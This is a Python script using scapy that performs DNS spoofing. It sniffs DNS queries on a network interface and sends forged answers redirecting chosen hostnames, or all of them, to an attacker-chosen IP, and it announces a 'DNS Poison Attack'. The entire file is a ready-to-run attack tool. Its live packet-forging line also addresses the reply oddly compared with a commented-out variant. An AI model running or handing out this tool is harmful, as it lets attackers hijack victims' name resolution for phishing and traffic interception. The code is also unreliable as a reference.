# DNS_Spoofing.py

import logging
from optparse import OptionParser
import netifaces
from scapy.all import send
from scapy.layers.dns import DNSQR, DNS, IP, UDP, DNSRR
from scapy.all import sniff

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


# Get IP address
def get_IP_address(my_iface):
    IP_addr = "default IP address"
    if my_iface in netifaces.interfaces():
        IP_addr = netifaces.ifaddresses(my_iface)[netifaces.AF_INET][0]["addr"]
    else:
        print("Failed to get IP address of chosen network interface ...")
    return IP_addr


# DNS Spoofing injector
def injector(pkt):
    redirect_dst = ""
    if pkt.haslayer(IP) and pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:
        affectedHost = pkt[DNSQR].qname

        if options.hostnames is not None:
            affectedHost = str(affectedHost, encoding="utf-8").rstrip(".")
            if affectedHost in mapping:
                print("DNS Query Packet described in hostnames is received:", affectedHost)
                redirect_dst = mapping[affectedHost]
                print("Redirect to:", redirect_dst)

            if redirect_dst == "":
                return

        else:
            redirect_dst = get_IP_address(options.interface)
            print("Redirect to:", redirect_dst)

        if pkt.haslayer(UDP):
            print(" ")
            print("Packet has UDP layer!")
            print("-------------- Spoofing Pkt Info -----------------")
            print("IP src:", pkt[IP].src, " | IP dst:", redirect_dst)
            print("UDP sport:", pkt[UDP].sport, " | UDP dport:", pkt[UDP].dport)
            print("DNS id:", pkt[DNS].id, " | DNS rdata:", redirect_dst)
            print("--------------------- End ------------------------")
            print(" ")

            spoofed_pkt = IP(dst=redirect_dst, src=pkt[IP].src) / \
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                          DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1,
                              an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=redirect_dst))
            # print(" ")
            # print("Packet has UDP layer!")
            # print("-------------- Spoofing Pkt Info -----------------")
            # print("IP src:", pkt[IP].src, " | IP dst:", pkt[IP].dst)
            # print("UDP sport:", pkt[UDP].sport, " | UDP dport:", pkt[UDP].dport)
            # print("DNS id:", pkt[DNS].id, " | DNS rdata:", redirect_dst)
            # print("--------------------- End ------------------------")
            # print(" ")
            # spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
            #               UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
            #               DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1,
            #                   an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=redirect_dst))
        else:
            print("Packet doesn't have UDP layer...")
            return

        print("Sending spoofed packet...")
        send(spoofed_pkt)
        print("---------------------------------------------------------------------------------")
        print(" ")


if __name__ == '__main__':
    mapping = {}
    parser = OptionParser()
    parser.set_conflict_handler("resolve")
    parser.add_option('-i', dest="interface")
    parser.add_option('-h', dest="hostnames")

    (options, remainder) = parser.parse_args()
    expression = remainder
    if len(expression) > 0:
        exp = expression[0]
    else:
        exp = ""

    if options.hostnames is None:
        redirect_to = get_IP_address(options.interface)
    else:
        redirect_to = ""
        file = open(options.hostnames, "r")
        for line in file:
            row = line.split()
            mapping[row[0]] = row[1]
        print("Redirecting list of hostnames:", mapping)

    print(" ")
    print("################################################################################")
    print("#                  Begin Preparing for DNS Poison Attack                       #")
    print("################################################################################")
    print(" ")

    sniff(filter=exp, prn=injector, store=0, iface=options.interface)
